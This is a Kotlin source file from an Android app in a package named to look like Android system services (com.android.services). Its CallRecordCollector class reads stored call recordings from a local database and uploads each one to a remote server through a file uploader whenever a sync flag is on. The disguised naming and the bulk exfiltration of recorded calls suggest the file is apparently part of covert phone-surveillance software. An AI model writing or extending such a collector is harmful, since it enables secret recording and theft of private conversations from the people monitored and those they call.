package com.android.services.logs.collectors

import android.content.Context
import com.android.services.db.entities.CallRecording
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.retrofit.FileUploader
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.logException
import com.android.services.util.logVerbose
import com.google.gson.GsonBuilder
import com.google.gson.reflect.TypeToken
import org.json.JSONArray

class CallRecordCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
) : LogsCollector {

    override fun uploadLogs() {
        if (AppConstants.syncCallRecording) {
            localDatabaseSource.selectCallRecordings { callRecordings ->
                if (callRecordings.isNotEmpty()) {
                    try {
                        val gson = GsonBuilder().create()
                        val mCallRecordingJSON =
                            JSONArray(gson.toJson(callRecordings,
                                object : TypeToken<List<CallRecording>>() {}.type))
                        val fileUploader = FileUploader(context,
                            AppConstants.CALL_RECORD_TYPE,
                            localDatabaseSource)
                        for (i in 0 until mCallRecordingJSON.length()) {
                            try {
                                fileUploader.uploadFile(mCallRecordingJSON.getJSONObject(i))
                            } catch (e: Exception) {
                                logException(e.message!!, AppConstants.CALL_RECORD_TYPE, e)
                            }
                        }
                    } catch (e: Exception) {
                        AppUtils.appendLog(context, "${AppConstants.CALL_RECORD_TYPE} ${e.message}")
                        logException(e.message!!, AppConstants.CALL_RECORD_TYPE, e)
                    }
                } else {
                    logVerbose("No CallRecordings found", AppConstants.CALL_RECORD_TYPE)
                }
            }
        } else {
            logVerbose("${AppConstants.CALL_RECORD_TYPE} Sync is Off")
        }
    }
}